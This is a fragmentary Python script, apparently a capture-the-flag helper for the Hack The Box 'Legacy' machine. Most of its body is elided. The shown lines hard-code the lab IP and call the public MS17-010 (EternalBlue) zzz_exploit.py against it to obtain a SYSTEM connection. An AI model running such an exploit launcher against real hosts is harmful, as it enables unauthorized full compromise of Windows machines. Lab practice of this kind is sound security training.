...
def banner():
    ...
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Legacy
    __________________________________________________________________________\n"""
...
target_machine="10.10.10.4" # change this if change ip on htb.
...
def default_cred_user():
    try:
        ...
        if machine_default_ip:
            ...
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Legacy Network");print(ln)
    except subprocess.CalledProcessError as e:
...
def exploit_eternal_blue_system32():
    ...
    commands_send(f"cd MS17-010 && python2.7 zzz_exploit.py {target_machine} browser")
    ...
    try:
        ...
        while True:
            ...
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","system32 connection"))
